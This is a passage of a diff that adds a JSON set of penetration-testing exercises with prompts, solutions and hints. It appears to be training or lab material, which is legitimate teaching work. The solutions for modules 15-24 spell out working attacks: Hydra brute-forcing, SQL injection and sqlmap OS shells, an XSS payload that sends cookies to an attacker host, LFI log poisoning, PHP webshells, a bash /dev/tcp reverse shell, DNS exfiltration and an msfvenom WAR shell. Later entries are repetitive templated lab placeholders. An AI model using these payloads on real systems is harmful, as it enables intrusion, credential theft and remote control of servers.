+    "hints": [
+      "Inject the FUZZ keyword into the Host header rather than the URL path."
+    ]
+  },
+  {
+    "module_id": 15,
+    "prompt": "Fuzz parameters in a GET request",
+    "solution": "1. Command: `ffuf -w parameters.txt -u http://target.com/page.php?FUZZ=test`.\n2. Look for anomalies in response length `-fs <default_size>` to identify valid hidden parameters.\n3. Test the identified parameter for vulnerabilities like XSS or LFI.",
+    "difficulty": "Medium",
+    "hints": [
+      "Use a parameter wordlist like burp-parameter-names.txt."
+    ]
+  },
+  {
+    "module_id": 15,
+    "prompt": "Fuzz POST data structures with ffuf",
+    "solution": "1. Command: `ffuf -w wordlist.txt -u http://target.com/api/login -X POST -d 'username=admin&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'`.\n2. Filter responses to look for 200 OK or 302 Redirect indicating successful login.",
+    "difficulty": "Hard",
+    "hints": [
+      "Specify `-X POST` and provide the data via `-d`."
+    ]
+  },
+  {
+    "module_id": 15,
+    "prompt": "Perform extension fuzzing to find backup files",
+    "solution": "1. Once a valid directory or file root is discovered, perform fuzzing to locate backups.\n2. Command: `ffuf -w config.txt -e .bak,.txt,.old,.zip -u http://target.com/FUZZ`.\n3. This automatically tests combinations like config.php.bak or config.zip.",
+    "difficulty": "Medium",
+    "hints": [
+      "The `-e` flag takes a comma-separated list of extensions."
+    ]
+  },
+  {
+    "module_id": 16,
+    "prompt": "Use Hydra to bruteforce HTTP POST login forms",
+    "solution": "1. Identify form parameters via Burp Suite.\n2. Command: `hydra -l admin -P rockyou.txt target.com http-post-form '/login.php:user=^USER^&pass=^PASS^:Invalid password'`.\n3. Wait for Hydra to identify combinations that bypass the 'Invalid password' failure string.",
+    "difficulty": "Medium",
+    "hints": [
+      "Correct identification of the failure string is critical."
+    ]
+  },
+  {
+    "module_id": 16,
+    "prompt": "Bruteforce an SSH service using Hydra",
+    "solution": "1. Define Target: `hydra -l root -P passwords.txt ssh://<TARGET_IP>`.\n2. Add `-t 4` to reduce thread count to prevent breaking the SSH daemon.\n3. Review the green text output indicating valid credentials.",
+    "difficulty": "Easy",
+    "hints": [
+      "Specify `ssh://` protocol directly in the target."
+    ]
+  },
+  {
+    "module_id": 16,
+    "prompt": "Generate a custom wordlist using cewl",
+    "solution": "1. Run `cewl http://target.com -d 3 -m 5 -w custom.txt`.\n2. This crawls depth 3, keeping words of at least 5 characters.\n3. Modify words using Hashcat rules (e.g., `-r best64.rule`) to expand permutations.",
+    "difficulty": "Medium",
+    "hints": [
+      "cewl scrapes a website for likely corporate password terms."
+    ]
+  },
+  {
+    "module_id": 16,
+    "prompt": "Perform a credential-based spray via RDP",
+    "solution": "1. Use `nxc smb <IP> -u users.txt -p pass.txt` to find working valid AD accounts.\n2. Then attempt RDP access via `nxc rdp <IP> -u user -p pass`.\n3. Alternatively use `hydra -L users.txt -p password123 rdp://<TARGET_IP>`.",
+    "difficulty": "Medium",
+    "hints": [
+      "Valid accounts don't inherently possess RDP rights; verify using RDP specific checks."
+    ]
+  },
+  {
+    "module_id": 16,
+    "prompt": "Identify default application credentials",
+    "solution": "1. Enumerate the service version (e.g. Tomcat 9.0).\n2. Search Default-Password databases or manuals.\n3. Try `tomcat:tomcat`, `admin:admin`, `admin:<blank>`. Proceed with bruteforce *only* after default tests fail.",
+    "difficulty": "Easy",
+    "hints": [
+      "Always try standards like admin/admin before wasting time bruteforcing."
+    ]
+  },
+  {
+    "module_id": 17,
+    "prompt": "Detect Error-based SQL Injection",
+    "solution": "1. Append a single quote `'` to the URL parameter `id=1'`.\n2. Look for database errors in the response, such as `You have an error in your SQL syntax`.\n3. The error confirms the application is not sanitizing input before sending to the database.",
+    "difficulty": "Easy",
+    "hints": [
+      "The single quote breaks string encapsulation."
+    ]
+  },
+  {
+    "module_id": 17,
+    "prompt": "Determine Column Counts with ORDER BY",
+    "solution": "1. Inject `1' ORDER BY 1-- -` to the vulnerable parameter.\n2. Increment the number (`ORDER BY 2`, `ORDER BY 3`, etc.).\n3. The exact column count is found when `ORDER BY N` errors out (meaning N-1 is valid).",
+    "difficulty": "Medium",
+    "hints": [
+      "Increase the ORDER BY integer until a database error occurs."
+    ]
+  },
+  {
+    "module_id": 17,
+    "prompt": "Extract database names via UNION SELECT",
+    "solution": "1. Assuming a 3-column table, use: `1' UNION SELECT 1,database(),3-- -`.\n2. For identifying tables, use `1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -`.\n3. Observe the output rendered directly in the webpage.",
+    "difficulty": "Hard",
+    "hints": [
+      "Ensure the number of outputs matches the column count from ORDER BY."
+    ]
+  },
+  {
+    "module_id": 17,
+    "prompt": "Identify Time-Based Blind SQLi in MySQL",
+    "solution": "1. Inject `1'; SELECT SLEEP(5)-- -`.\n2. Observe the browser or proxy loading time. If it delays by exactly 5 seconds, it's vulnerable to time-based injection.\n3. Use conditional logic: `1' AND (SELECT IF(1=1, SLEEP(5), 0))-- -`.",
+    "difficulty": "Medium",
+    "hints": [
+      "Use SLEEP() for MySQL or WAITFOR DELAY for MSSQL."
+    ]
+  },
+  {
+    "module_id": 17,
+    "prompt": "Exploit Second-Order SQLi",
+    "solution": "1. Inject payload into an initial profile setting, such as a Username: `admin'-- `.\n2. Save the settings. The query safely stores the payload.\n3. Visit a secondary page where the application queries the username without escaping, effectively executing the payload.",
+    "difficulty": "Hard",
+    "hints": [
+      "Second-order SQLi relies on payloads stored safely at rest and executed unsafely later."
+    ]
+  },
+  {
+    "module_id": 18,
+    "prompt": "Run basic SQLMap enumeration on a GET parameter",
+    "solution": "1. Run `sqlmap -u 'http://target.com/vuln.php?id=1' --batch`.\n2. Identify the parameter type and payload confirmed by tool.\n3. Add `--dbs` to retrieve database names.",
+    "difficulty": "Easy",
+    "hints": [
+      "The `--batch` flag avoids interactive prompts during execution."
+    ]
+  },
+  {
+    "module_id": 18,
+    "prompt": "Use SQLMap with Burp Suite request files",
+    "solution": "1. In Burp, right-click a captured request containing cookies/POST data and 'Save Item'.\n2. Run `sqlmap -r request.txt -p username --batch`.\n3. This isolates the `username` parameter for testing while maintaining correct session cookies.",
+    "difficulty": "Medium",
+    "hints": [
+      "Save the request via Burp and use `-r <file>`."
+    ]
+  },
+  {
+    "module_id": 18,
+    "prompt": "Extract specific table columns using SQLMap",
+    "solution": "1. Once the DB and Table are found, target them explicitly.\n2. Command: `sqlmap -u '<url>' -D <database_name> -T <table_name> --columns`.\n3. Then execute a dump: `sqlmap -D <db> -T <table> -C user,password --dump`.",
+    "difficulty": "Medium",
+    "hints": [
+      "Use -D for database, -T for table, -C for columns."
+    ]
+  },
+  {
+    "module_id": 18,
+    "prompt": "Increase verbosity and risk levels to catch complex injections",
+    "solution": "1. Command: `sqlmap -u '<url>' --level=5 --risk=3`.\n2. This configuration tests HTTP Headers (like User-Agent) and uses heavy OR-based logic and extended delays.\n3. Only use on authorized environments as risk 3 modifies database tables.",
+    "difficulty": "Hard",
+    "hints": [
+      "Level goes to 5, Risk goes to 3."
+    ]
+  },
+  {
+    "module_id": 18,
+    "prompt": "Achieve RCE via SQLMap OS Shell",
+    "solution": "1. Ensure MySQL server has `FILE` privileges and a writable web root path.\n2. Command `sqlmap -u '<url>' --os-shell`.\n3. Provide the webroot path (e.g. `/var/www/html`) and interact with the resulting webshell staging prompt.",
+    "difficulty": "Hard",
+    "hints": [
+      "The `--os-shell` flag allows writing a stager to a webroot."
+    ]
+  },
+  {
+    "module_id": 19,
+    "prompt": "Identify Stored XSS in a comment form",
+    "solution": "1. Submit a generic payload: `<script>alert(1)</script>` into a comment field.\n2. Reload the page containing the comment.\n3. A popup displaying '1' demonstrates the payload was stored and executed upon browser rendering.",
+    "difficulty": "Easy",
+    "hints": [
+      "Stored XSS triggers persistently across page reloads."
+    ]
+  },
+  {
+    "module_id": 19,
+    "prompt": "Steal an Administrator's Cookie via XSS",
+    "solution": "1. Setup an HTTP listener (e.g. `python -m http.server 80`).\n2. Inject payload: `<script>fetch('http://<YOUR_IP>/?cookie=' + document.cookie);</script>`.\n3. When the admin reviews the page, their browser executes the script and logs their session cookie to your server.",
+    "difficulty": "Medium",
+    "hints": [
+      "Use JavaScript `fetch` or `document.location` to send the `document.cookie` variable."
+    ]
+  },
+  {
+    "module_id": 19,
+    "prompt": "Bypass basic XSS filters using capitalization and alternative tags",
+    "solution": "1. If `<script>` is blocked, use alternative casings like `<ScRiPt>alert(1)</sCrIpT>`.\n2. If the tag is entirely stripped, use image context: `<img src=x onerror=alert(1)>`.\n3. For SVG vectors, use `<svg onload=alert(1)>`.",
+    "difficulty": "Medium",
+    "hints": [
+      "Use HTML tag handlers like `onerror` or `onload` instead of `<script>` tags."
+    ]
+  },
+  {
+    "module_id": 19,
+    "prompt": "Identify and exploit DOM-based XSS",
+    "solution": "1. Identify JavaScript using weak logic: `document.getElementById('name').innerHTML = location.hash`.\n2. Craft URL: `http://target.com/#<img src=x onerror=alert(1)>`.\n3. The vulnerable client-side script parses the fragment and embeds the malicious payload into the DOM.",
+    "difficulty": "Hard",
+    "hints": [
+      "DOM XSS never touches the backend server parsing flow."
+    ]
+  },
+  {
+    "module_id": 19,
+    "prompt": "Bypass Content Security Policy (CSP) for XSS execution",
+    "solution": "1. Analyze CSP Headers. If `unsafe-inline` is allowed, generic `<script>` will work.\n2. If strict, utilize allowed domains. E.g. upload a payload file to an allowed CDN endpoint.\n3. Utilize JSONP endpoints from whitelisted domains to callback malicious code.",
+    "difficulty": "Hard",
+    "hints": [
+      "Check the CSP rule restrictions using a tool like Google's CSP Evaluator."
+    ]
+  },
+  {
+    "module_id": 20,
+    "prompt": "Execute an LFI traversal to read /etc/passwd",
+    "solution": "1. Identify a file load parameter: `http://target.com/index.php?page=about.html`.\n2. Inject traversal payload: `?page=../../../../../../etc/passwd`.\n3. Ensure response body reveals user accounts like `root:x:0:0:`.",
+    "difficulty": "Easy",
+    "hints": [
+      "Use multiple `../` patterns to exceed directory depth."
+    ]
+  },
+  {
+    "module_id": 20,
+    "prompt": "Bypass LFI filename appendage using Null Byte formatting",
+    "solution": "1. In older PHP (<5.3.4), if the backend appends `.php` to your request.\n2. Inject payload: `?page=../../../../etc/passwd%00`.\n3. The backend evaluates it as `/etc/passwd\\0.php`, terminating the string early and reading the passwd file.",
+    "difficulty": "Medium",
+    "hints": [
+      "The `%00` character acts as a string terminator in C-based architectures."
+    ]
+  },
+  {
+    "module_id": 20,
+    "prompt": "Utilize PHP Base64 Filter wrapper to extract Source Code",
+    "solution": "1. Identify target PHP file containing logic (e.g. `config.php`).\n2. Inject payload: `?page=php://filter/read=convert.base64-encode/resource=config`.\n3. Decode the returned Base64 string locally to view backend DB references or logic.",
+    "difficulty": "Medium",
+    "hints": [
+      "The `php://filter` wrapper lets you read raw PHP without letting the server execute it first."
+    ]
+  },
+  {
+    "module_id": 20,
+    "prompt": "Elevate LFI to RCE using Log Poisoning",
+    "solution": "1. Use netcat or curl to inject PHP into a User-Agent header: `curl -A '<?php system($_GET[\"c\"]); ?>' http://<target>`.\n2. The server records this User-Agent inside `/var/log/apache2/access.log`.\n3. Trigger LFI reading the log: `?page=../../../../var/log/apache2/access.log&c=id`. The injected PHP is parsed and executed.",
+    "difficulty": "Hard",
+    "hints": [
+      "Log poisoning requires read-access over Apache/Nginx or SSH log paths."
+    ]
+  },
+  {
+    "module_id": 20,
+    "prompt": "Exploit RFI (Remote File Inclusion)",
+    "solution": "1. Ensure application configuration `allow_url_include=On` is designated.\n2. Setup external attack payload server `http://<YOUR_IP>/shell.php`.\n3. Trigger RFI: `?page=http://<YOUR_IP>/shell.php` to fetch and execute external PHP code.",
+    "difficulty": "Medium",
+    "hints": [
+      "Unlike LFI, RFI incorporates external protocol schemes like HTTP/FTP."
+    ]
+  },
+  {
+    "module_id": 21,
+    "prompt": "Bypass Web Server upload filtering using double extensions",
+    "solution": "1. Attempt uploading generic `shell.php` (Blocked).\n2. Rename file to `shell.jpg.php` or `shell.php.jpg`.\n3. If the server only checks the final extension or scans left-to-right, the bypass executes allowing a malicious upload.",
+    "difficulty": "Easy",
+    "hints": [
+      "Combine both valid and malicious extensions to confuse the parser."
+    ]
+  },
+  {
+    "module_id": 21,
+    "prompt": "Bypass Content-Type MIME filtering checks",
+    "solution": "1. Catch the upload request using Burp Suite.\n2. Locate the parameter defining the MIME data `Content-Type: application/x-php`.\n3. Modify it manually to `Content-Type: image/jpeg` and forward. The server accepts it mimicking an image despite PHP payload.",
+    "difficulty": "Medium",
+    "hints": [
+      "MIME type validation relies exclusively on header trust."
+    ]
+  },
+  {
+    "module_id": 21,
+    "prompt": "Upload a basic PHP webshell for server interaction",
+    "solution": "1. Create payload `<?php system($_REQUEST['cmd']); ?>` inside a file named `shell.php`.\n2. Upload bypassing implemented security checks.\n3. Browse to the upload path: `http://target.com/uploads/shell.php?cmd=whoami`.",
+    "difficulty": "Easy",
+    "hints": [
+      "The `system()` function bridges PHP interaction to bash OS interaction."
+    ]
+  },
+  {
+    "module_id": 21,
+    "prompt": "Evade Magic Bytes sequence validation",
+    "solution": "1. Applications check file signatures/magic bytes to confirm legitimacy.\n2. Append valid GIF signatures at the start of your webshell: `GIF89a; <?php system($_GET['cmd']); ?>`.\n3. The backend categorizes the magic bytes as a GIF, successfully storing the PHP shell.",
+    "difficulty": "Medium",
+    "hints": [
+      "Add `GIF89a;` at the beginning of your PHP payload block."
+    ]
+  },
+  {
+    "module_id": 21,
+    "prompt": "Exploit configuration overrides using .htaccess uploads",
+    "solution": "1. If allowed, upload a custom `.htaccess` file containing `AddType application/x-httpd-php .jpg`.\n2. Ensure the `.htaccess` resides within the `/uploads/` root.\n3. Upload a standard `payload.jpg` containing PHP code. Apache parses the `.jpg` as executable PHP.",
+    "difficulty": "Hard",
+    "hints": [
+      "The `.htaccess` file redefines execution standards for internal directories."
+    ]
+  },
+  {
+    "module_id": 22,
+    "prompt": "Identify Command Injection using string manipulation and delimiters",
+    "solution": "1. Locate parameter interacting with OS contexts (e.g. Ping forms).\n2. Inject `127.0.0.1 ; id`.\n3. Review resulting output showing `uid=xxx gid=xxx`, confirming the semicolons broke command segregation.",
+    "difficulty": "Easy",
+    "hints": [
+      "Use standard shell operators like `;`, `|`, `&&`."
+    ]
+  },
+  {
+    "module_id": 22,
+    "prompt": "Confirm Blind Command Injection using time delays",
+    "solution": "1. Inject payload containing time constraints: `127.0.0.1 ; sleep 5`.\n2. Observe if page execution response delays by 5 seconds relative to previous interactions.\n3. The delay confirms active injection without visible text outputs.",
+    "difficulty": "Medium",
+    "hints": [
+      "The `sleep` command halts Linux thread execution."
+    ]
+  },
+  {
+    "module_id": 22,
+    "prompt": "Exfiltrate Command data using Out-of-Band (OOB) DNS",
+    "solution": "1. Leverage Burp Collaborator or Interactsh to listen for DNS lookups.\n2. Inject payload: `127.0.0.1 ; nslookup $(whoami).your_domain.com`.\n3. Review Collaborator logs resulting in queries formatted like `www-data.your_domain.com`, indicating execution success.",
+    "difficulty": "Hard",
+    "hints": [
+      "Use subshells like `$()` to nest command output within external lookups."
+    ]
+  },
+  {
+    "module_id": 22,
+    "prompt": "Bypass Whitespace/Space filters during injection",
+    "solution": "1. App developer prevents space utilization attempting to stop arguments.\n2. Use the IFS shell variable shortcut: `127.0.0.1;cat${IFS}/etc/passwd`.\n3. Command executes parsing `${IFS}` structurally as space requirements.",
+    "difficulty": "Hard",
+    "hints": [
+      "Look into Bash `$IFS` structural environments or brace expansion `{cat,/etc/passwd}`."
+    ]
+  },
+  {
+    "module_id": 22,
+    "prompt": "Upgrade command injection to a full reverse shell",
+    "solution": "1. Open a local netcat listener `nc -nlvp 4444`.\n2. Inject reverse shell payload: `; bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'`.\n3. URL Encode parameters using Burp if transmitted via GET parameters. Receive shell.",
+    "difficulty": "Medium",
+    "hints": [
+      "Using `bash -c` encapsulates the network redirection stream to prevent quoting errors."
+    ]
+  },
+  {
+    "module_id": 23,
+    "prompt": "Identify Horizontal IDOR logic flaws",
+    "solution": "1. Authenticate to the web application as `User A`.\n2. Monitor API request parameter referencing specific account modifications: `POST /api/user/update HTTP/1.1  {\"id\": 101}`.\n3. Change `101` to `102` (belonging to another user) and observe if the modification succeeds.",
+    "difficulty": "Easy",
+    "hints": [
+      "Modify ID parameters affecting resource definitions outside your scope."
+    ]
+  },
+  {
+    "module_id": 23,
+    "prompt": "Exploit Basic XXE to extract local server files",
+    "solution": "1. Identify an endpoint communicating through XML (or converting JSON to XML).\n2. Inject DOCTYPE entity reference: `<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>`.\n3. Call the entity block within XML values: `<user>&xxe;</user>` and observe if `/etc/passwd` reflects in the response.",
+    "difficulty": "Medium",
+    "hints": [
+      "XML vulnerabilities occur when DTDs or external entities aren't constrained safely."
+    ]
+  },
+  {
+    "module_id": 23,
+    "prompt": "Confirm CSRF functionality using Cross-Site requests",
+    "solution": "1. Identify specific state-changing activities lacking randomized token parameters (Anti-CSRF).\n2. Generate malicious HTML Payload: `<form action=\"http://bank/transfer\" method=\"POST\"><input type=\"hidden\" name=\"amount\" value=\"5000\"></form><script>document.forms[0].submit();</script>`.\n3. Trigger by simulating a victim interacting with the HTML artifact affecting their active session context.",
+    "difficulty": "Medium",
+    "hints": [
+      "CSRF simulates trusted user functionality against endpoints lacking CSRF-token protections."
+    ]
+  },
+  {
+    "module_id": 23,
+    "prompt": "Identify Server-Side Request Forgery vulnerabilities",
+    "solution": "1. Locate parameter attempting external application calls (e.g. Image URL load `?url=`).\n2. Change parameter tracking mapping to localhost ports or hidden addresses `url=http://127.0.0.1:22`.\n3. Check error banners verifying interactions or retrieve AWS Metadata instance variables (`http://169.254.169.254/latest/meta-data/`).",
+    "difficulty": "Hard",
+    "hints": [
+      "SSRF coerces the server into making arbitrary external/internal proxy requests."
+    ]
+  },
+  {
+    "module_id": 23,
+    "prompt": "Discover Vertical IDOR exploiting privileges",
+    "solution": "1. Perform IDOR interaction, not substituting sibling standard user accounts, but substituting reference to known `/api/admin` functions.\n2. Attempt referencing admin IDs directly or forcing attribute manipulation e.g., `{\"user_role\":\"admin\"}`.\n3. Complete backend functional calls mapped outside your standard privilege access context.",
+    "difficulty": "Medium",
+    "hints": [
+      "Vertical IDOR shifts from modifying equivalent-roles to modifying escalated access values."
+    ]
+  },
+  {
+    "module_id": 24,
+    "prompt": "Enumerate specific WordPress parameters iteratively",
+    "solution": "1. Use WPScan for holistic verification: `wpscan --url http://target.com --enumerate u,p,t`.\n2. Output extracts vulnerable plugins (`p`), generic misconfigured themes (`t`), and enumerates standard Users (`u`).",
+    "difficulty": "Easy",
+    "hints": [
+      "WPScan automates the WordPress vulnerability detection ecosystem efficiently."
+    ]
+  },
+  {
+    "module_id": 24,
+    "prompt": "Achieve generic RCE on WordPress systems",
+    "solution": "1. Aquire Administrator level privileges to the specific target platform.\n2. Navigate to Appearance -> Theme Editor.\n3. Modify generic core template parts like `404.php` injecting `<?php system($_GET['cmd']); ?>`, then browse to arbitrary non-existent pages issuing shell commands.",
+    "difficulty": "Medium",
+    "hints": [
+      "PHP logic binds inherently to standard core WP-theme configurations within the dashboard."
+    ]
+  },
+  {
+    "module_id": 24,
+    "prompt": "Establish Shell execution via generic Jenkins architecture",
+    "solution": "1. Obtain initial access locating the Jenkins script interaction console (`/script`).\n2. Use Groovy constructs to spawn subprocess interaction mapping OS context overrides: `def proc = \"id\".execute(); proc.waitFor(); println proc.in.text`.\n3. Groovy architecture reflects Linux-layer interaction securely.",
+    "difficulty": "Medium",
+    "hints": [
+      "Jenkins script console uses Groovy syntax to encapsulate OS interactions."
+    ]
+  },
+  {
+    "module_id": 24,
+    "prompt": "Exploit unconfigured exposed internal repositories (.git)",
+    "solution": "1. Identify directory traversal resulting in `.git/` visibility.\n2. Extract environment repositories mimicking server source components `git-dumper http://target.com/.git/ local_dump`.\n3. Review resulting directory extracting `.env` configs mapping hardcoded passwords.",
+    "difficulty": "Easy",
+    "hints": [
+      "Git metadata is commonly stored unencrypted and improperly restricted on specific production networks."
+    ]
+  },
+  {
+    "module_id": 24,
+    "prompt": "Upload malicious payloads via Tomcat applications",
+    "solution": "1. Gather administrative UI access to the specific Apache Tomcat control portal (`/manager/html`).\n2. Create malicious `.war` payload configuration simulating an application module: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war`.\n3. Upload within generic Tomcat deployment functions leading to shell generation.",
+    "difficulty": "Hard",
+    "hints": [
+      "Tomcat managers expect `.war` architecture payload formatting."
+    ]
+  },
+  {
+    "module_id": 25,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Linux Privilege Escalation Lab 1 - You are tasked with applying Linux Privilege Escalation concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Linux Privilege Escalation.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 25,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Linux Privilege Escalation Lab 2 - You are tasked with applying Linux Privilege Escalation concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Linux Privilege Escalation.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 25,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Linux Privilege Escalation Lab 3 - You are tasked with applying Linux Privilege Escalation concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Linux Privilege Escalation.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 25,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Linux Privilege Escalation Lab 4 - You are tasked with applying Linux Privilege Escalation concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Linux Privilege Escalation.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 25,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Linux Privilege Escalation Lab 5 - You are tasked with applying Linux Privilege Escalation concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Linux Privilege Escalation.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 26,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Windows Privilege Escalation Lab 1 - You are tasked with applying Windows Privilege Escalation concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Windows Privilege Escalation.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 26,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Windows Privilege Escalation Lab 2 - You are tasked with applying Windows Privilege Escalation concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Windows Privilege Escalation.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 26,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Windows Privilege Escalation Lab 3 - You are tasked with applying Windows Privilege Escalation concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Windows Privilege Escalation.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 26,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Windows Privilege Escalation Lab 4 - You are tasked with applying Windows Privilege Escalation concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Windows Privilege Escalation.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 26,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Windows Privilege Escalation Lab 5 - You are tasked with applying Windows Privilege Escalation concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Windows Privilege Escalation.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 27,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Getting Started Lab 1 - You are tasked with applying Getting Started concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Getting Started.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 27,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Getting Started Lab 2 - You are tasked with applying Getting Started concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Getting Started.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 27,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Getting Started Lab 3 - You are tasked with applying Getting Started concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Getting Started.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 27,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Getting Started Lab 4 - You are tasked with applying Getting Started concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Getting Started.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 27,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Getting Started Lab 5 - You are tasked with applying Getting Started concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Getting Started.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 28,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Vulnerability Scanning with Nessus Lab 1 - You are tasked with applying Vulnerability Scanning with Nessus concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Vulnerability Scanning with Nessus.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 28,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Vulnerability Scanning with Nessus Lab 2 - You are tasked with applying Vulnerability Scanning with Nessus concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Vulnerability Scanning with Nessus.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 28,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Vulnerability Scanning with Nessus Lab 3 - You are tasked with applying Vulnerability Scanning with Nessus concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Vulnerability Scanning with Nessus.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 28,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Vulnerability Scanning with Nessus Lab 4 - You are tasked with applying Vulnerability Scanning with Nessus concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Vulnerability Scanning with Nessus.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 28,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
